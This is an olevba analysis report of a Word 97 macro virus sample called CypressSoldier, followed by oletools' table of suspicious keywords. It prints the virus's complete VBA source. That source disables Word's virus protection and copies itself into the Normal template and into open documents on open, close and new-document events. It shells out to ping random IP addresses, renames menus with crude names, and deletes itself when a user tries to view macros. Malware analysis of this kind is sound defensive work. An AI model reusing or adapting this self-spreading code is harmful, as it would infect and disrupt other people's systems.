olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cypress-06997f7f64a14363bd24491bdbcc95a44c7db549
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cypress-06997f7f64a14363bd24491bdbcc95a44c7db549 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CypressSoldier.bas 
in file: Virus.MSWord.Cypress-06997f7f64a14363bd24491bdbcc95a44c7db549 - OLE stream: 'Macros/VBA/CypressSoldier'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub payload()
On Error GoTo telos
Randomize
If Day(Now) = 30 Then
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "Creator of this virus is yozac[d0s]"
    .Heading = "WM97.CypressSoldier"
    .Animation = msoAnimationSearching
    .Show
  End With
ElseIf Day(Now) = 13 Then
MsgBox "Press OK to start death pinging randomly,hehehe", , "Pinger 666"
g = Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd)
Shell "c:\windows\ping.exe " & g & " -n 666"
With Assistant.NewBalloon
.Animation = msoAnimationSendingMail
.Icon = msoIconAlert
.Text = "yozac just finished the hell ping of " & g & ".From [d0s] with lobe"
.Heading = "Sorry infected by CypressSoldier"
.Show
End With
End If
Exit Sub
telos:
End Sub
Sub Infect()
On Error Resume Next
Dim normal As Boolean, avtive As Boolean
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(i).Name = "CypressSoldier" Then normal = True
Next
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents.Item(i).Name = "CypressSoldier" Then Active = True
Next
If normal = False And Active = True Then
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "CypressSoldier", wdOrganizerObjectProjectItems
ElseIf normal = True And Active = False Then
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "CypressSoldier", wdOrganizerObjectProjectItems
End If
End Sub
Sub AboutHelp()
On Error Resume Next
MsgBox "MicroSux Programming Error" & vbCr & "Starting formating menus...", vbCritical, "Error:Cypress Soldier inside"
Application.CommandBars(1).Name = "MicroSux"
Application.CommandBars(2).Name = "SuckMe"
Application.CommandBars.MenuAnimationStyle = msoMenuAnimationUnfold
Application.CommandBars(3).Name = "CypressSoldier"
Application.CommandBars(4).Name = "BigBang"
Application.CommandBars(5).Name = "Tits&Nipples"
Application.CommandBars(6).Name = "y0zaC-"
Application.CommandBars(7).Name = "#vir"
Application.CommandBars(8).Name = "HipHop"
Application.CommandBars(9).Name = "Kissmy dick"
Application.CommandBars.Add "Virus", , "File"
MsgBox "Don't try to beat me" & vbCr & "I am stronger than you billy", vbApplicationModal, "Bill for you"
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "cypress soldier"
    .Text = "Please leave the computer now.System is going to be deleted."
    .Animation = msoAnimationCharacterSuccessMajor
End With
End Sub
Sub AutoOpen()
On Error Resume Next
Infect
payload
ActiveDocument.Save
End Sub
Sub AutoNEw()
On Error Resume Next
Infect
payload
End Sub
Sub SaveAs()
On Error Resume Next
Infect
payload
End Sub
Sub autoclose()
On Error Resume Next
Infect
payload
End Sub
Sub ToolsMacro()
NormalTemplate.VBProject.VBComponents.Remove "CypressSoldier"
NormalTemplate.Saved = True
ActiveDocument.VBProject.VBComponents.Remove "CypressSoldier"
ActiveDocument.Saved = True
Application.ShowVisualBasicEditor = True
End Sub
Sub filetemplates()
End Sub
Sub ViewVBcode()
NormalTemplate.VBProject.VBComponents.Remove "CypressSoldier"
NormalTemplate.Saved = True
ActiveDocument.VBProject.VBComponents.Remove "CypressSoldier"
ActiveDocument.Saved = True
Application.ShowVisualBasicEditor = True
End Sub
Sub EditPaste()
MsgBox "No data paste", vbCritical, "Word 97 Alert"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |AutoNEw             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ping.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

